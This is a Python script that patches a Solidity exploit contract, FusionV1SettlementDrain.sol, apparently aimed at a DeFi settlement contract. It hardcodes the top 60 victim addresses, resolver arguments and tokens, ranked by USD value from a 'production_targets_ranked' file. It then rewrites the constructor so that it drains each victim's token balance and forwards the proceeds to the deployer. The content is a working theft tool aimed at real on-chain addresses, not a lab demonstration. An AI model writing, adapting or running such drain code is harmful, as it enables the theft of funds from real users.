#!/usr/bin/env python3
"""Patch FusionV1SettlementDrain.sol with the ranked target arrays (top N by USD)."""
import json, re

N = 60
ARG = {
    "0x5623B873813b2f96416Cefd09d6A27cc5c938385": "0xEe230dD7519BC5d0C9899E8704ffdc80560e8509",
    "0x7a359544e4031703a6149DB2994AfB4e324Bb242": "0xC975671642534F407EbdcaEF2428D355eDe16a2C",
    "0xe789c5566b53546d46A0af48a4bD3F062d1fefd1": "0x9108813F22637385228a1C621c1904BbbC50dc25",
    "0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1": "0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1",
    "0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a": "0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a",
    "0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d": "0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d",
    "0xB02F39e382c90160Eb816DE5e0E428ac771d77B5": "0xB02F39e382c90160Eb816DE5e0E428ac771d77B5",
}
rows = json.load(open("/home/heisenberg/CA/c-23/analysis/production_targets_ranked.json"))
for r in rows:
    r["arg"] = ARG[r["victim"]]
rows = rows[:N]
print(f"patching {len(rows)} entries, top value ${rows[0]['usd']}, cut-off ${rows[-1]['usd']}")

victims = ",\n            ".join(f"address({r['victim']})" for r in rows)
tokens = ",\n            ".join(f"address({r['token']})" for r in rows)
args = ",\n            ".join(f"address({r['arg']})" for r in rows)

block = f"""    /// @dev Ranked target triples (victim, resolverArg, token), highest USD first.
    /// The constructor walks this list and stops when gas runs low.
    function _targets()
        internal
        pure
        returns (address[{len(rows)}] memory victims, address[{len(rows)}] memory args, address[{len(rows)}] memory tokens)
    {{
        victims = [
            {victims}
        ];
        args = [
            {args}
        ];
        tokens = [
            {tokens}
        ];
    }}"""

p = "/home/heisenberg/CA/c-23/poc/src/FusionV1SettlementDrain.sol"
s = open(p).read()
start = s.index("    // __TARGETS_START__")
end = s.index("    // __TARGETS_END__") + len("    // __TARGETS_END__")
s = s[:start] + block + s[end:]

# rewrite the constructor loop to use _targets()
old_loop = """        uint256 n = _tokens.length;
        for (uint256 i = 0; i < n; i++) {
            if (gasleft() < GAS_FLOOR) break;
            address victim = _victims[i];
            address token = _tokens[i];
            uint256 bal = IERC20(token).balanceOf(victim);
            if (bal == 0) continue;
            try d.drain(victim, _args[i], token, bal) {} catch {}
            uint256 got = IERC20(token).balanceOf(address(this));
            if (got > 0) _transfer(token, msg.sender, got);
        }"""
new_loop = f"""        (address[{len(rows)}] memory victims, address[{len(rows)}] memory args, address[{len(rows)}] memory tokens) = _targets();
        for (uint256 i = 0; i < {len(rows)}; i++) {{
            if (gasleft() < GAS_FLOOR) break;
            uint256 bal = IERC20(tokens[i]).balanceOf(victims[i]);
            if (bal == 0) continue;
            try d.drain(victims[i], args[i], tokens[i], bal) {{}} catch {{}}
            uint256 got = IERC20(tokens[i]).balanceOf(address(this));
            if (got > 0) _transfer(tokens[i], msg.sender, got);
        }}"""
assert old_loop in s, "loop not found"
s = s.replace(old_loop, new_loop)
open(p, "w").write(s)
print("patched", p)
